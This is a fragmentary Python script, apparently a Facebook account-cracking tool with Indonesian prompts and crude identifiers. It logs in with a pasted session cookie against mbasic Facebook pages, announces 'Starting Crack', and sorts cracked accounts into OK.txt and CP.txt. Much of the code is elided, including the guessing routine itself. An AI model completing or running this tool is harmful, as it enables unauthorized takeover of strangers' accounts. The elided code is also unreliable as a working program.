...
def hasil(ngocok,ismylife):
	if len(ngocok) != 0 or len(ismylife) != 0:
		...
		else:print("[*] \x1b[1;32mHasil OK Tersimpan Di File : CP.txt\x1b[0m")
		if len(ismylife)==0:pass
		else:print("[*] \x1b[1;33mHasil CP Tersimpan Di File : CP.txt")
		exit()
...
class ngentod:
	...
	def fuck(self):
		pilih=input("[?] Pilih : ")
		if pilih in["l","L"]:
			tod=open("ok.txt","r").read()
			tOd=open("cp.txt","r").read()
			...
			exit("[*] Thank You For Using My Script")
		elif pilih in[""," "]:
	...
	def askk(self):
		...
		if njir in(""," "):
				...
				if pwek in(""," "):
					...
					def xhh(xss=None):
						...
						if pilih in(""," "):
							...
							print("[*] Starting Crack..\n[*] Hasil OK Tersimpan Di File : OK.txt\n[*] Hasil CP Tersimpan Di File : CP.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							...
							print("[!] Harap ISI Dengan Benar");xhh()
			...
			print("[!] Harap ISI Dengan Benar");self.askk()
	...
	def ngontol(self):
		...
		if nanya in[""," "]:
			...
			print("[!] Harap ISI Dengan Benar");self.ngontol()
def zxss(kuk):
	dict={}
	if "; " in kuk:
		kek=kuk.split("; ")
	...
	def login(self):
		try:
			...
			if "mbasic_logout_button" in cek:
				print("\n\n[*] Selamat Datang "+re.findall("\<title\>(.*?)<\/title\>",cek)[0]+" To My Script")
				waktu(1)
				print("[!] Mohon Tunggu Sebentar Proses Login...............")
				...
				if "Laporkan Masalah" in cek:
					...
					mengontol.reaksi()
					exit("[✓] Login Berhasil, Silahkan Jalan Kan Ulang Script")
				else:
					mengontol=aap_afandi.ganteng(zxss(self.cok),self.url)
